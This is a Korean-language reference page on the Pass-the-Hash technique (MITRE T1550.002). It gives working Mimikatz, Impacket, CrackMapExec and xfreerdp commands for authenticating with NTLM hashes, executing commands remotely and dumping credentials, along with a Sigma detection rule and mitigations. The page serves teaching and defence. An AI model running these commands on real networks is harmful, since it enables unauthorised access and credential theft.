# T1550.002 — Pass the Hash

## 개요

**TA0008 / T1550.002**  
NTLM 해시를 직접 사용하여 인증하는 기법입니다. 실제 패스워드를 크래킹할 필요 없이 NTLM 해시만으로 Windows 인증을 통과할 수 있습니다. LSASS 덤프 등으로 획득한 해시를 그대로 재사용합니다.

---

## 동작 방식

1. LSASS 덤프, 레지스트리(SAM), DCSync 등으로 NTLM 해시 획득
2. NTLM 해시를 직접 인증 토큰으로 사용하여 대상 시스템 접근
3. SMB, WMI, RDP(Restricted Admin Mode) 등 다양한 프로토콜 경유
4. 패스워드 변경 없이는 해시 재사용 공격 지속 가능

**동작 원리:**
- NTLM 인증은 패스워드 평문 대신 MD4 해시를 Challenge-Response에 사용
- 해시 자체가 패스워드 역할을 하므로 평문 없이 인증 가능

## 주요 커맨드 / 실습

### Mimikatz PTH
```cmd
# NTLM 해시로 새 프로세스 실행 (네트워크 자격증명 포함)
mimikatz# sekurlsa::pth /user:administrator /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee /run:cmd.exe

# mstsc.exe 실행으로 RDP PTH (Restricted Admin Mode 필요)
mimikatz# sekurlsa::pth /user:administrator /domain:corp.local /ntlm:aad3b435b51404eeaad3b435b51404ee /run:mstsc.exe
```

### Impacket - 다양한 프로토콜 PTH
```bash
# SMB/PsExec PTH
python3 psexec.py administrator@192.168.1.10 -hashes aad3b435b51404ee:ntlmhash

# WMI PTH
python3 wmiexec.py administrator@192.168.1.10 -hashes aad3b435b51404ee:ntlmhash

# SMBExec PTH
python3 smbexec.py administrator@192.168.1.10 -hashes aad3b435b51404ee:ntlmhash

# secretsdump PTH로 원격 자격증명 덤프
python3 secretsdump.py administrator@192.168.1.10 -hashes aad3b435b51404ee:ntlmhash
```

### CrackMapExec PTH
```bash
# NTLM 해시로 SMB 접근
crackmapexec smb 192.168.1.0/24 -u administrator -H aad3b435b51404eeaad3b435b51404ee

# 명령 실행
crackmapexec smb 192.168.1.10 -u administrator -H ntlmhash -x "whoami"

# SAM 덤프
crackmapexec smb 192.168.1.10 -u administrator -H ntlmhash --sam
```

### xfreerdp PTH
```bash
# Restricted Admin Mode RDP PTH
xfreerdp /u:administrator /pth:aad3b435b51404eeaad3b435b51404ee /v:192.168.1.10 /cert-ignore

# 대상 시스템에서 Restricted Admin Mode 활성화 (사전 필요)
# reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

### Restricted Admin Mode 활성화
```cmd
# 대상 시스템에서 RDP PTH를 위한 Restricted Admin Mode 활성화
reg add "HKLM\System\CurrentControlSet\Control\Lsa" /v DisableRestrictedAdmin /t REG_DWORD /d 0 /f
```

## 탐지 방법

### Sigma Rule
```yaml
title: Pass-the-Hash Attack Detection
id: f2c8e5a3-7d4b-4e9c-a1f6-3b8d5e2a7c4f
status: stable
description: Detects Pass-the-Hash attacks via NTLM network logon from non-machine accounts
logsource:
    product: windows
    service: security
detection:
    selection:
        EventID: 4624
        LogonType: 3
        AuthenticationPackageName: 'NTLM'
        LmPackageName: 'NTLM V2'
    filter:
        SubjectUserName|endswith: '$'
    condition: selection and not filter
falsepositives:
    - Legitimate NTLM authentication from service accounts
    - Legacy applications using NTLM
level: medium
tags:
    - attack.lateral_movement
    - attack.defense_evasion
    - attack.t1550.002
```

## 대응 방안

1. Windows Defender Credential Guard 활성화 (NTLM 해시 추출 방지)
2. Protected Users 보안 그룹에 특권 계정 추가 (NTLM 인증 비활성화)
3. LAPS(Local Administrator Password Solution)로 로컬 관리자 패스워드 다양화
4. NTLM 인증 제한 (Kerberos 강제 사용)
5. 네트워크 세그멘테이션으로 横移動 경로 제한
6. SMB 서명 필수 적용
